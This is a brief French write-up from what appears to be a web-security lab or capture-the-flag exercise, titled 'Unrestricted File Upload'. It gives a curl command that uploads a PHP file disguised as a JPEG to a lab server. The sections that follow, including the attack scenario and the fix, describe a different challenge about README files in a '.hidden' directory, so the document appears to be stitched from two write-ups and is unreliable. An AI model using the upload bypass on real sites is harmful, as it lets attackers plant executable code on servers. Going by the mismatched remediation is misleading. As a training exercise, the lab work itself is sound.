# Unrestricted File Upload

#### Page: _/index.php?page=upload_


## Description de la vulnérabilité :
curl -s -X POST -F "uploaded=@./test.php;type=image/jpeg" -F "Upload=Upload" "http://192.168.1.13?page=upload" | grep "flag"
On passe un fichier php, par curl, en specifiant que le type est une image, on Upload

On remarque de nombreux dossiers dans le dossier `.hidden` a la racine de l'application web. Chacun d'entre eux contient un fichier `README` dans lequel se trouvent d'etranges phrases.
On recupere le flag on testant l'ensemble des `README`.


## Scénario d'attaque :
Un script permet de tester l'ensemble des `README` presents dans les dossiers.


## Correctifs :
- Il est difficile de comprendre l'utilité de ce type de methode afin de dissimuler des informations confidentiels.